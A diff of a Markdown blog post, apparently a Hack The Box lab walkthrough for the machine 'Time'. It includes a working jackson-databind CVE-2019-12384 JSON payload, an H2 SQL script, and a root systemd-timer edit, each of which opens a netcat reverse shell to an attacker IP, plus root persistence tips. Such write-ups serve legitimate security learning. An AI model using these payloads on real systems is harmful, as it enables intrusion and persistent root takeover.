@@ -1,27 +1,30 @@
 ---
-date: 2021-04-03 16:00:00+00:00
-images: 
-- https://i.imgur.com/jiSvU4u.png
+title: 'Walktrough: HTB Time'
 language: en-US
 localeid: htb-time
+date: 2021-04-03T16:00:00.000Z
 tags:
-- HackTheBox
-- Jackson
-- FasterXML
-- Service Hijack
-- HTB Linux
-- HTB Medium
-- Walktrough
-title: 'Walktrough: HTB Time'
-authors: ['default']
+  - HackTheBox
+  - Jackson
+  - FasterXML
+  - Service Hijack
+  - HTB Linux
+  - HTB Medium
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/jiSvU4u.png'
+authors:
+  - default
 ---
+
 Hello everyone!
 
 The machine of this week will be **Time**, another Linux box medium rated from [Hack The Box](https://www.hackthebox.eu), created by [
 egotisticalSW](https://app.hackthebox.eu/users/94858) and [felamos](https://app.hackthebox.eu/users/27390).
 
-:information_source: **Info**: Write-ups for Hack the Box are always posted as soon as machines get retired.
-[info]
+\:information\_source: **Info**: Write-ups for Hack the Box are always posted as soon as machines get retired.
+\[info]
 
 ![HTB Time](https://i.imgur.com/mJmeefG.png)
 
@@ -61,11 +64,11 @@ After some enumeration with `whatweb` and `nikto`, I haven't found anything usef
 
 Analyzing the application, we have two functionalities: **Beautify** and **Validate**:
 
-- The option beautify, after receiving a valid JSON, formats it in a pretty manner and, sending an invalid content (e.g. "test"), returns a `null` value.
+* The option beautify, after receiving a valid JSON, formats it in a pretty manner and, sending an invalid content (e.g. "test"), returns a `null` value.
 
 ![Online JSON Parser - Time - beautify](https://i.imgur.com/tpO2p3r.png)
 
-- The Validate option (in beta) checks the syntax of the JSON provided. When we send an invalid request (e.g. "test"), the exception below is returned.
+* The Validate option (in beta) checks the syntax of the JSON provided. When we send an invalid request (e.g. "test"), the exception below is returned.
 
 ```plaintext
 Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN
@@ -81,7 +84,7 @@ Looking for CVEs on jackson-databind, I have found the following for code execut
 
 Of the 4 listed, I have found for **CVE-2019-12384** a working PoC at [this blog](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html), which I have used to gain initial access to the box. The following steps were used to get a reverse shell:
 
-- Created a file called `inject.sql` with the code below, modified from the version at the blog, to start a reverse shell to the attacker machine at 4443 and published using a python3 HTTP server (`sudo python3 -m http.server 80`) from the directory where the file resides.
+* Created a file called `inject.sql` with the code below, modified from the version at the blog, to start a reverse shell to the attacker machine at 4443 and published using a python3 HTTP server (`sudo python3 -m http.server 80`) from the directory where the file resides.
 
 ```sql
 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
@@ -92,8 +95,8 @@ $$;
 CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f')
 ```
 
-- Configured listener using netcat by running `nc -lnvp 4443`.
-- Sent payload below in the application instead of a JSON content to be validated.
+* Configured listener using netcat by running `nc -lnvp 4443`.
+* Sent payload below in the application instead of a JSON content to be validated.
 
 ```plaintext
 ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.10.10/inject.sql'"}]
@@ -129,7 +132,7 @@ The enumeration was done by running `linpeas.sh` and one of the findings called 
 
 This file is configured as a **system timer** (`/etc/systemd/system/timer_backup.timer` and `/etc/systemd/system/timer_backup.service`) and set be executed **every 10 seconds** as `root`.
 
-As we have enough permissions to edit the shell script, I have added the line below to return a reverse shell on the attacker machine and, after a few seconds, a reverse shell was obtained! :smile:
+As we have enough permissions to edit the shell script, I have added the line below to return a reverse shell on the attacker machine and, after a few seconds, a reverse shell was obtained! \:smile:
 
 ```bash
 rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/g
@@ -151,11 +154,11 @@ uid=0(root) gid=0(root) groups=0(root)
 
 In case you want to get a persistent connection at this machine we have two initial options:
 
-- Configure the system timer to add the public key in the `/root/.ssh/authorized_keys` file, allowing us to SSH as `root`.
-- Spawn another reverse shell as soon as we get the initial connection, which can be done in multiple ways like Metasploit AutoRunScript and `netcat`, prepending the listener with the instruction to send the payload as soon as it gets connected, as you can see in an example below where the `id` command is executed as soon as the session is started:
+* Configure the system timer to add the public key in the `/root/.ssh/authorized_keys` file, allowing us to SSH as `root`.
+* Spawn another reverse shell as soon as we get the initial connection, which can be done in multiple ways like Metasploit AutoRunScript and `netcat`, prepending the listener with the instruction to send the payload as soon as it gets connected, as you can see in an example below where the `id` command is executed as soon as the session is started:
 
 ```bash
 printf "id\n" | nc -lnvp 4443
 ```
 
-I hope this was useful to you and see you guys in the next post! :smiley:
+I hope this was useful to you and see you guys in the next post! \:smiley:
